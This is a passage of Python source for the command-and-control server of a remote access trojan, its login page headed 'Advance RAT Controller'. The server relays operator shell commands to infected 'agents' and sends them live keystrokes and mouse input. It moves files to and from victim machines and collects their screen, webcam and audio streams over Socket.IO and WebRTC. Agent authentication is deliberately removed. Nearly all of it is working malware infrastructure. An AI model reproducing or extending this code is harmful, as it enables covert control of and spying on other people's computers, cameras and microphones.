                margin-bottom: 10px;
            }
            
            .login-header p {
                color: var(--text-secondary);
                font-size: 0.9rem;
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: var(--text-secondary);
                font-weight: 500;
            }
            
            .form-group input {
                width: 100%;
                background: var(--secondary-bg);
                border: 1px solid var(--glass-border);
                border-radius: 8px;
                padding: 12px 16px;
                color: var(--text-primary);
                font-size: 1rem;
                transition: all 0.3s ease;
            }
            
            .form-group input:focus {
                outline: none;
                border-color: var(--accent-blue);
                box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
            }
            
            .login-btn {
                width: 100%;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                border: none;
                border-radius: 8px;
                padding: 12px;
                color: white;
                font-weight: 600;
                font-size: 1rem;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            
            .login-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
            }
            
            .error-message {
                background: rgba(255, 71, 87, 0.2);
                color: #ff4757;
                border: 1px solid #ff4757;
                border-radius: 8px;
                padding: 12px;
                margin-bottom: 20px;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>Advance RAT Controller</h1>
                <p>Admin Authentication Required</p>
            </div>
            
            {% with messages = get_flashed_messages(with_categories=true) %}
                {% if messages %}
                    {% for category, message in messages %}
                        <div class="error-message">{{ message }}</div>
                    {% endfor %}
                {% endif %}
            {% endwith %}
            
            <form method="POST">
                <div class="form-group">
                    <label for="password">Admin Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="login-btn">Access Dashboard</button>
            </form>
        </div>
    </body>
    </html>
    '''
    return render_template_string(login_template)

# Logout route
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# Configuration status endpoint (for debugging)
@app.route('/config-status')
@require_auth
def config_status():
    """Display current configuration status (for debugging)"""
    return jsonify({
        'admin_password_set': bool(Config.ADMIN_PASSWORD),
        'admin_password_length': len(Config.ADMIN_PASSWORD),
        'secret_key_set': bool(Config.SECRET_KEY),
        'host': Config.HOST,
        'port': Config.PORT,
        'session_timeout': Config.SESSION_TIMEOUT,
        'max_login_attempts': Config.MAX_LOGIN_ATTEMPTS,
        'login_timeout': Config.LOGIN_TIMEOUT,
        'current_login_attempts': len(LOGIN_ATTEMPTS),
        'blocked_ips': [ip for ip, (attempts, _) in LOGIN_ATTEMPTS.items() if attempts >= Config.MAX_LOGIN_ATTEMPTS],
        'password_hash_algorithm': 'PBKDF2-SHA256',
        'hash_iterations': Config.HASH_ITERATIONS,
        'salt_length': Config.SALT_LENGTH
    })

# Password change endpoint
@app.route('/change-password', methods=['POST'])
@require_auth
def change_password():
    """Change the admin password"""
    global ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT
    
    try:
        data = request.get_json()
        current_password = data.get('current_password', '')
        new_password = data.get('new_password', '')
        
        # Verify current password
        if not verify_password(current_password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
            return jsonify({'success': False, 'message': 'Current password is incorrect'}), 400
        
        # Validate new password
        if len(new_password) < 8:
            return jsonify({'success': False, 'message': 'New password must be at least 8 characters long'}), 400
        
        # Generate new hash for the new password
        new_hash, new_salt = create_secure_password_hash(new_password)
        ADMIN_PASSWORD_HASH = new_hash
        ADMIN_PASSWORD_SALT = new_salt
        
        # Update the config (this will persist for the current session)
        Config.ADMIN_PASSWORD = new_password
        
        return jsonify({'success': True, 'message': 'Password changed successfully'}), 200
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error changing password: {str(e)}'}), 500

# --- Web Dashboard HTML removed - now using React frontend ---
# Dashboard now served by React frontend at /
# All HTML functionality has been moved to React components


# In-memory storage for agent data
AGENTS_DATA = defaultdict(lambda: {"sid": None, "last_seen": None})
DOWNLOAD_BUFFERS = defaultdict(lambda: {"chunks": [], "total_size": 0, "local_path": None})

# Remove the agent secret authentication - allow direct agent access
# AGENT_SHARED_SECRET = os.environ.get("AGENT_SHARED_SECRET", "sphinx_agent_secret")

# def require_agent_secret(f):
#     def decorated(*args, **kwargs):
#         if request.headers.get("X-AGENT-SECRET") != AGENT_SHARED_SECRET:
#             return "Forbidden", 403
#         return f(*args, **kwargs)
#     decorated.__name__ = f.__name__
#     return decorated

# --- Operator-facing endpoints ---

@app.route("/")
def index():
    if is_authenticated():
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route("/dashboard")
@require_auth
def dashboard():
    # Dashboard is now served by React frontend
    return redirect("/")

# --- Real-time Streaming Endpoints (COMMENTED OUT - REPLACED WITH OVERVIEW) ---
# 
# STREAMING OPTIMIZATION FOR REAL-TIME MONITORING:
# - Frame interval: 0.5 seconds (2 FPS)
# - Optimized for real-time monitoring with 0.5-second picture updates
# - Reduced latency and improved responsiveness
# - Better performance for monitoring applications
#

# VIDEO_FRAMES = defaultdict(lambda: None)
# CAMERA_FRAMES = defaultdict(lambda: None)
# AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())

# Frame timing for real-time monitoring
# FRAME_INTERVAL = 0.5  # 0.5-second intervals for 2 FPS

# HTTP streaming endpoints for browser compatibility (COMMENTED OUT)
# @app.route('/video_feed/<agent_id>')
# @require_auth
# def video_feed(agent_id):
#     """Stream video feed for a specific agent"""
#     def generate_video():
#         while True:
#             if agent_id in VIDEO_FRAMES_H264 and VIDEO_FRAMES_H264[agent_id]:
#                 frame = VIDEO_FRAMES_H264[agent_id]
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
#             else:
#                 # Generate a demo frame with agent ID for testing
#                 import io
#                 from PIL import Image, ImageDraw, ImageFont
#                 
#                 # Create a demo image
#                 img = Image.new('RGB', (640, 480), color='#1e40af')
#                 draw = ImageDraw.Draw(img)
#                 
#                 # Try to use a font, fallback to default if not available
#                 try:
#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
#                 except:
#                     font = ImageFont.load_default()
#                 
#                 # Draw demo text
#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
#                 draw.text((320, 250), "Screen Stream", fill='white', anchor='mm', font=font)
#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
#                 
#                 # Convert to JPEG
#                 img_io = io.BytesIO()
#                 img.save(img_io, 'JPEG', quality=85)
#                 img_io.seek(0)
#                 demo_frame = img_io.getvalue()
#                 
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
#             time.sleep(0.5)  # 2 FPS
#     
#     return Response(generate_video(),
#                     mimetype='multipart/x-mixed-replace; boundary=frame',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# @app.route('/camera_feed/<agent_id>')
# @require_auth
# def camera_feed(agent_id):
#     """Stream camera feed for a specific agent"""
#     def generate_camera():
#         while True:
#             if agent_id in CAMERA_FRAMES_H264 and CAMERA_FRAMES_H264[agent_id]:
#                 frame = CAMERA_FRAMES_H264[agent_id]
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
#             else:
#                 # Generate a demo frame with agent ID for testing
#                 import io
#                 from PIL import Image, ImageDraw, ImageFont
#                 
#                 # Create a demo image
#                 img = Image.new('RGB', (640, 480), color='#059669')
#                 draw = ImageDraw.Draw(img)
#                 
#                 # Try to use a font, fallback to default if not available
#                 try:
#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
#                 except:
#                     font = ImageFont.load_default()
#                 
#                 # Draw demo text
#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
#                 draw.text((320, 250), "Camera Stream", fill='white', anchor='mm', font=font)
#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
#                 
#                 # Convert to JPEG
#                 img_io = io.BytesIO()
#                 img.save(img_io, 'JPEG', quality=85)
#                 img_io.seek(0)
#                 demo_frame = img_io.getvalue()
#                 
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
#             time.sleep(0.5)  # 2 FPS
#     
#     return Response(generate_camera(),
#                     mimetype='multipart/x-mixed-replace; boundary=frame',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# @app.route('/audio_feed/<agent_id>')
# @require_auth
# def audio_feed(agent_id):
#     """Stream audio feed for a specific agent"""
#     def generate_audio():
#         while True:
#             if agent_id in AUDIO_FRAMES_OPUS and AUDIO_FRAMES_OPUS[agent_id]:
#                 frame = AUDIO_FRAMES_OPUS[agent_id]
#                 yield frame
#             else:
#                 # Send silence if no data available
#                 yield b'\x00' * 1024
#             time.sleep(0.1)  # 10 FPS for audio
#     
#     return Response(generate_audio(),
#                     mimetype='audio/wav',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# --- Socket.IO Event Handlers ---

@socketio.on('connect')
def handle_connect():
    # Note: Socket.IO doesn't have direct access to Flask session
    # In a production environment, you'd want to implement proper Socket.IO authentication
    # For now, we'll allow connections but validate on specific events
    print(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    # Find which agent disconnected and remove it
    disconnected_agent_id = None
    for agent_id, data in AGENTS_DATA.items():
        if data["sid"] == request.sid:
            disconnected_agent_id = agent_id
            break
    if disconnected_agent_id:
        del AGENTS_DATA[disconnected_agent_id]
        emit('agent_list_update', AGENTS_DATA, broadcast=True)
        print(f"Agent {disconnected_agent_id} disconnected.")
    else:
        print(f"Operator client disconnected: {request.sid}")

@socketio.on('operator_connect')
def handle_operator_connect():
    """When a web dashboard connects."""
    join_room('operators')
    emit('agent_list_update', AGENTS_DATA) # Send current agent list to the new operator
    print("Operator dashboard connected.")

@socketio.on('agent_connect')
def handle_agent_connect(data):
    """When an agent connects and registers itself."""
    agent_id = data.get('agent_id')
    if not agent_id:
        return
    
    AGENTS_DATA[agent_id]["sid"] = request.sid
    AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
    
    # Notify all operators of the new agent
    emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
    print(f"Agent {agent_id} connected with SID {request.sid}")

@socketio.on('execute_command')
def handle_execute_command(data):
    """Operator issues a command to an agent."""
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('command', {'command': command}, room=agent_sid)
        print(f"Sent command '{command}' to agent {agent_id}")
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)

@socketio.on('command_result')
def handle_command_result(data):
    """Agent sends back the result of a command."""
    agent_id = data.get('agent_id')
    output = data.get('output')
    
    # Forward the output to all operator dashboards
    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
    print(f"Received output from {agent_id}: {output[:100]}...")

@socketio.on('live_key_press')
def handle_live_key_press(data):
    """Operator sends a live key press to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('key_press', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_move')
def handle_live_mouse_move(data):
    """Operator sends a live mouse move to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_move', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_click')
def handle_live_mouse_click(data):
    """Operator sends a live mouse click to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_click', data, room=agent_sid, include_self=False)

# --- Chunked File Transfer Handlers ---
@socketio.on('upload_file_chunk')
def handle_upload_file_chunk(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    chunk = data.get('data')
    offset = data.get('offset')
    destination_path = data.get('destination_path')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('file_chunk_from_operator', {
            'filename': filename,
            'data': chunk,
            'offset': offset,
            'destination_path': destination_path
        }, room=agent_sid)

@socketio.on('upload_file_end')
def handle_upload_file_end(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('file_upload_complete_from_operator', data, room=agent_sid)
        print(f"Upload of {data.get('filename')} to {agent_id} complete.")

@socketio.on('download_file')
def handle_download_file(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    local_path = data.get('local_path')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        print(f"Requesting download of '{filename}' from {agent_id} to local path {local_path}")
        DOWNLOAD_BUFFERS[filename]["local_path"] = local_path # Store local path
        emit('request_file_chunk_from_agent', {'filename': filename}, room=agent_sid)
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found.', 'type': 'error'}, room=request.sid)

@socketio.on('file_chunk_from_agent')
def handle_file_chunk_from_agent(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    chunk = data.get('chunk')
    offset = data.get('offset')
    total_size = data.get('total_size')
    error = data.get('error')

    if error:
        emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': error}, room='operators')
        if filename in DOWNLOAD_BUFFERS: del DOWNLOAD_BUFFERS[filename]
        return

    if filename not in DOWNLOAD_BUFFERS:
        DOWNLOAD_BUFFERS[filename] = {"chunks": [], "total_size": total_size, "local_path": None}

    DOWNLOAD_BUFFERS[filename]["chunks"].append(base64.b64decode(chunk.split(',')[1]))
    DOWNLOAD_BUFFERS[filename]["total_size"] = total_size # Update total size in case it was not set initially

    current_download_size = sum(len(c) for c in DOWNLOAD_BUFFERS[filename]["chunks"])

    # If all chunks received, save the file locally
    if current_download_size >= total_size:
        full_content = b"".join(DOWNLOAD_BUFFERS[filename]["chunks"])
        local_path = DOWNLOAD_BUFFERS[filename]["local_path"]

        if local_path:
            try:
                # Ensure directory exists
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                with open(local_path, 'wb') as f:
                    f.write(full_content)
                print(f"Successfully downloaded {filename} to {local_path}")
                emit('file_download_chunk', {
                    'agent_id': agent_id,
                    'filename': filename,
                    'chunk': chunk,
                    'offset': offset,
                    'total_size': total_size,
                    'local_path': local_path # Pass local_path back to frontend
                }, room='operators')
            except Exception as e:
                print(f"Error saving downloaded file {filename} to {local_path}: {e}")
                emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': f'Error saving to local path: {e}'}, room='operators')
        else:
            # If no local_path was specified, send the chunks to the frontend for browser download
            emit('file_download_chunk', {
                'agent_id': agent_id,
                'filename': filename,
                'chunk': chunk,
                'offset': offset,
                'total_size': total_size
            }, room='operators')
        
        del DOWNLOAD_BUFFERS[filename]
    else:
        # Continue sending chunks to frontend for progress update
        emit('file_download_chunk', {
            'agent_id': agent_id,
            'filename': filename,
            'chunk': chunk,
            'offset': offset,
            'total_size': total_size
        }, room='operators')

# Global variables for WebRTC and video streaming
WEBRTC_PEER_CONNECTIONS = {}
WEBRTC_VIEWER_CONNECTIONS = {}
VIDEO_FRAMES_H264 = defaultdict(lambda: None)
CAMERA_FRAMES_H264 = defaultdict(lambda: None)
AUDIO_FRAMES_OPUS = defaultdict(lambda: None)

@socketio.on('screen_frame')
def handle_screen_frame(data):
    """Accept H.264 (or JPEG for fallback) binary frames from agent via socket.io."""
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if agent_id and frame:
        VIDEO_FRAMES_H264[agent_id] = frame  # Store latest frame for this agent

@socketio.on('request_video_frame')
def handle_request_video_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in VIDEO_FRAMES_H264:
        frame = VIDEO_FRAMES_H264[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        emit('video_frame', {'frame': base64.b64encode(frame).decode('utf-8')})

@socketio.on('request_audio_frame')
def handle_request_audio_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in AUDIO_FRAMES_OPUS:
        frame = AUDIO_FRAMES_OPUS[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        emit('audio_frame', {'frame': base64.b64encode(frame).decode('utf-8')})

@socketio.on('request_camera_frame')
def handle_request_camera_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in CAMERA_FRAMES_H264:
        frame = CAMERA_FRAMES_H264[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        emit('camera_frame', {'frame': base64.b64encode(frame).decode('utf-8')})



@socketio.on('camera_frame')
def handle_camera_frame(data):
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if agent_id and frame:
        CAMERA_FRAMES_H264[agent_id] = frame

@socketio.on('audio_frame')
def handle_audio_frame(data):
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if agent_id and frame:
        AUDIO_FRAMES_OPUS[agent_id] = frame

# --- WebRTC Socket.IO Event Handlers ---

@socketio.on('webrtc_offer')
def handle_webrtc_offer(data):
    """Handle WebRTC offer from agent"""
    agent_id = data.get('agent_id')
    offer_sdp = data.get('offer')
    
    if not agent_id or not offer_sdp:
        emit('webrtc_error', {'message': 'Invalid offer data'}, room=request.sid)
        return
    
    try:
        # Create or get existing peer connection
        if agent_id not in WEBRTC_PEER_CONNECTIONS:
            pc = create_webrtc_peer_connection(agent_id)
            if not pc:
                emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
                return
        else:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        
        # Set remote description (offer)
        offer = RTCSessionDescription(sdp=offer_sdp, type='offer')
        
        # Use proper async handling for WebRTC operations
        def handle_webrtc_offer_async():
            try:
                loop = asyncio.get_event_loop()
                # Set remote description
                asyncio.run_coroutine_threadsafe(pc.setRemoteDescription(offer), loop)
                # Create answer
                future = asyncio.run_coroutine_threadsafe(pc.createAnswer(), loop)
                future.add_done_callback(lambda f: handle_answer_created(f, agent_id, request.sid))
            except RuntimeError:
                # No event loop, run synchronously
                async def async_operations():
                    await pc.setRemoteDescription(offer)
                    answer = await pc.createAnswer()
                    handle_answer_created_sync(answer, agent_id, request.sid)
                asyncio.run(async_operations())
        
        # Run in thread to avoid blocking
        import threading
        threading.Thread(target=handle_webrtc_offer_async, daemon=True).start()
        
        print(f"WebRTC offer received from {agent_id}")
        
    except Exception as e:
        print(f"Error handling WebRTC offer from {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error processing offer: {str(e)}'}, room=request.sid)

def handle_answer_created(future, agent_id, sid):
    """Handle WebRTC answer creation"""
    try:
        answer = future.result()
        
        # Use proper async handling for setLocalDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(WEBRTC_PEER_CONNECTIONS[agent_id].setLocalDescription(answer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_local_desc():
                await WEBRTC_PEER_CONNECTIONS[agent_id].setLocalDescription(answer)
            asyncio.run(set_local_desc())
        
        # Send answer back to agent
        socketio.emit('webrtc_answer', {
            'answer': answer.sdp,
            'type': answer.type
        }, room=sid)
        
        print(f"WebRTC answer sent to {agent_id}")
        
    except Exception as e:
        print(f"Error creating WebRTC answer for {agent_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error creating answer: {str(e)}'}, room=sid)

def handle_answer_created_sync(answer, agent_id, sid):
    """Handle WebRTC answer creation for synchronous context"""
    try:
        # Send answer back to agent
        socketio.emit('webrtc_answer', {
            'answer': answer.sdp,
            'type': answer.type
        }, room=sid)
        
        print(f"WebRTC answer sent to {agent_id}")
        
    except Exception as e:
        print(f"Error sending WebRTC answer for {agent_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error sending answer: {str(e)}'}, room=sid)

@socketio.on('webrtc_ice_candidate')
def handle_webrtc_ice_candidate(data):
    """Handle ICE candidate from agent"""
    agent_id = data.get('agent_id')
    candidate = data.get('candidate')
    
    if not agent_id or not candidate or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        
        # Use proper async handling for addIceCandidate
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(pc.addIceCandidate(candidate), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def add_ice_candidate():
                await pc.addIceCandidate(candidate)
            asyncio.run(add_ice_candidate())
            
        print(f"ICE candidate added for {agent_id}")
        
    except Exception as e:
        print(f"Error adding ICE candidate for {agent_id}: {e}")

# @socketio.on('webrtc_start_streaming')
# def handle_webrtc_start_streaming(data):
#     """Handle WebRTC streaming start request"""
#     agent_id = data.get('agent_id')
#     stream_type = data.get('type', 'all')  # screen, audio, camera, all
#     
#     if not agent_id:
#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
#         return
#     
#     try:
#         # Ensure peer connection exists
#         if agent_id not in WEBRTC_PEER_CONNECTIONS:
#             pc = create_webrtc_peer_connection(agent_id)
#             if not pc:
#                 emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
#                 return
#         
#         # Notify agent to start WebRTC streaming
#         emit('start_webrtc_streaming', {
#             'type': stream_type,
#             'ice_servers': WEBRTC_CONFIG['ice_servers'],
#             'codecs': WEBRTC_CONFIG['codecs']
#         }, room=request.sid)
#         
#         print(f"WebRTC streaming started for {agent_id} ({stream_type})")
#         
#     except Exception as e:
#         print(f"Error starting WebRTC streaming for {agent_id}: {e}")
#         emit('webrtc_error', {'message': f'Error starting streaming: {str(e)}'}, room=request.sid)

# @socketio.on('webrtc_stop_streaming')
# def handle_webrtc_stop_streaming(data):
#     """Handle WebRTC streaming stop request"""
#     agent_id = data.get('agent_id')
#     
#     if not agent_id:
#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
#         return
#     
#     try:
#         # Close WebRTC connection
#         close_webrtc_connection(agent_id)
#         
#         # Notify agent to stop WebRTC streaming
#         emit('stop_webrtc_streaming', {}, room=request.sid)
#         
#         print(f"WebRTC streaming stopped for {agent_id}")
#         
#     except Exception as e:
#         print(f"Error stopping WebRTC streaming for {agent_id}: {e}")
#         emit('webrtc_error', {'message': f'Error stopping streaming: {str(e)}'}, room=request.sid)

@socketio.on('webrtc_get_stats')
def handle_webrtc_get_stats(data):
    """Handle WebRTC stats request"""
    agent_id = data.get('agent_id')
    
    if not agent_id:
        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        stats = get_webrtc_stats(agent_id)
        if stats:
            emit('webrtc_stats', stats, room=request.sid)
        else:
            emit('webrtc_error', {'message': 'No WebRTC connection found'}, room=request.sid)
        
    except Exception as e:
        print(f"Error getting WebRTC stats for {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error getting stats: {str(e)}'}, room=request.sid)

@socketio.on('webrtc_set_quality')
def handle_webrtc_set_quality(data):
    """Handle WebRTC quality settings"""
    agent_id = data.get('agent_id')
    quality = data.get('quality', 'auto')  # low, medium, high, auto
    
    if not agent_id:
        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        # Forward quality setting to agent
        emit('set_webrtc_quality', {'quality': quality}, room=request.sid)
        print(f"WebRTC quality set to {quality} for {agent_id}")
        
    except Exception as e:
        print(f"Error setting WebRTC quality for {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error setting quality: {str(e)}'}, room=request.sid)

# --- WebRTC Viewer Management ---

@socketio.on('webrtc_viewer_connect')
def handle_webrtc_viewer_connect(data):
    """Handle WebRTC viewer connection"""
    viewer_id = request.sid
    agent_id = data.get('agent_id')
    
    if not agent_id or agent_id not in WEBRTC_STREAMS:
        emit('webrtc_error', {'message': 'Agent not available for WebRTC'}, room=request.sid)
        return
    
    try:
        # Create viewer peer connection
        viewer_pc = RTCPeerConnection()
        
        # Configure ICE servers
        for ice_server in WEBRTC_CONFIG['ice_servers']:
            viewer_pc.addIceServer(ice_server)
        
        # Store viewer data
        WEBRTC_VIEWERS[viewer_id] = {
            'agent_id': agent_id,
            'pc': viewer_pc,
            'streams': {}
        }
        
        # Add existing tracks from agent
        agent_streams = WEBRTC_STREAMS[agent_id]
        for track_kind, track in agent_streams.items():
            try:
                sender = viewer_pc.addTrack(track)
                WEBRTC_VIEWERS[viewer_id]['streams'][track_kind] = sender
            except Exception as e:
                print(f"Error adding track {track_kind} to viewer {viewer_id}: {e}")
        
        # Set up viewer event handlers
        @viewer_pc.on("connectionstatechange")
        async def on_viewer_connectionstatechange():
            print(f"Viewer {viewer_id} connection state: {viewer_pc.connectionState}")
            if viewer_pc.connectionState == "failed":
                await viewer_pc.close()
                if viewer_id in WEBRTC_VIEWERS:
                    del WEBRTC_VIEWERS[viewer_id]
        
        @viewer_pc.on("icecandidate")
        def on_viewer_icecandidate(candidate):
            if candidate:
                emit('webrtc_ice_candidate', {
                    'agent_id': agent_id,
                    'candidate': candidate
                }, room=viewer_id)
        
        # Create offer for viewer
        def create_viewer_offer():
            try:
                loop = asyncio.get_event_loop()
                future = asyncio.run_coroutine_threadsafe(viewer_pc.createOffer(), loop)
                future.add_done_callback(lambda f: handle_viewer_offer_created(f, viewer_id))
            except RuntimeError:
                # No event loop, run synchronously
                async def create_offer():
                    offer = await viewer_pc.createOffer()
                    handle_viewer_offer_created_sync(offer, viewer_id)
                asyncio.run(create_offer())
        
        # Run in thread to avoid blocking
        threading.Thread(target=create_viewer_offer, daemon=True).start()
        
        print(f"WebRTC viewer {viewer_id} connected to agent {agent_id}")
        
    except Exception as e:
        print(f"Error connecting WebRTC viewer {viewer_id} to agent {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error connecting viewer: {str(e)}'}, room=request.sid)

def handle_viewer_offer_created(future, viewer_id):
    """Handle viewer offer creation"""
    try:
        offer = future.result()
        
        # Use proper async handling for setLocalDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(WEBRTC_VIEWERS[viewer_id]['pc'].setLocalDescription(offer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_local_desc():
                await WEBRTC_VIEWERS[viewer_id]['pc'].setLocalDescription(offer)
            asyncio.run(set_local_desc())
        
        # Send offer to viewer
        socketio.emit('webrtc_viewer_offer', {
            'offer': offer.sdp,
            'type': offer.type
        }, room=viewer_id)
        
        print(f"WebRTC viewer offer sent to {viewer_id}")
        
    except Exception as e:
        print(f"Error creating WebRTC viewer offer for {viewer_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error creating viewer offer: {str(e)}'}, room=viewer_id)

def handle_viewer_offer_created_sync(offer, viewer_id):
    """Handle viewer offer creation for synchronous context"""
    try:
        # Send offer to viewer
        socketio.emit('webrtc_viewer_offer', {
            'offer': offer.sdp,
            'type': offer.type
        }, room=viewer_id)
        
        print(f"WebRTC viewer offer sent to {viewer_id}")
        
    except Exception as e:
        print(f"Error sending WebRTC viewer offer for {viewer_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error sending viewer offer: {str(e)}'}, room=viewer_id)

@socketio.on('webrtc_viewer_answer')
def handle_webrtc_viewer_answer(data):
    """Handle viewer answer"""
    viewer_id = request.sid
    answer_sdp = data.get('answer')
    
    if not answer_sdp or viewer_id not in WEBRTC_VIEWERS:
        return
    
    try:
        viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
        answer = RTCSessionDescription(sdp=answer_sdp, type='answer')
        
        # Use proper async handling for setRemoteDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.setRemoteDescription(answer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_remote_desc():
                await viewer_pc.setRemoteDescription(answer)
            asyncio.run(set_remote_desc())
            
        print(f"WebRTC viewer answer received from {viewer_id}")
        
    except Exception as e:
        print(f"Error setting viewer answer for {viewer_id}: {e}")

@socketio.on('webrtc_viewer_disconnect')
def handle_webrtc_viewer_disconnect():
    """Handle WebRTC viewer disconnection"""
    viewer_id = request.sid
    
    if viewer_id in WEBRTC_VIEWERS:
        try:
            viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
            
            # Use proper async handling for close
            try:
                loop = asyncio.get_event_loop()
                asyncio.run_coroutine_threadsafe(viewer_pc.close(), loop)
            except RuntimeError:
                # No event loop, run synchronously
                async def close_viewer():
                    await viewer_pc.close()
                asyncio.run(close_viewer())
                
            del WEBRTC_VIEWERS[viewer_id]
            print(f"WebRTC viewer {viewer_id} disconnected")
        except Exception as e:
            print(f"Error disconnecting WebRTC viewer {viewer_id}: {e}")

# Advanced WebRTC Monitoring and Optimization Event Handlers
@socketio.on('webrtc_quality_change')
def handle_webrtc_quality_change(data):
    """Handle WebRTC quality change requests from adaptive bitrate control"""
    agent_id = data.get('agent_id')
    quality = data.get('quality')
    bandwidth_stats = data.get('bandwidth_stats')
    
    print(f"Quality change request for {agent_id}: {quality}")
    print(f"Bandwidth stats: {bandwidth_stats}")
    
    # Forward quality change to agent
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('webrtc_quality_change', {
            'quality': quality,
            'bandwidth_stats': bandwidth_stats
        }, room=agent_sid)
        print(f"Quality change command sent to agent {agent_id}")
    else:
        print(f"Agent {agent_id} not found for quality change")

@socketio.on('webrtc_frame_dropping')
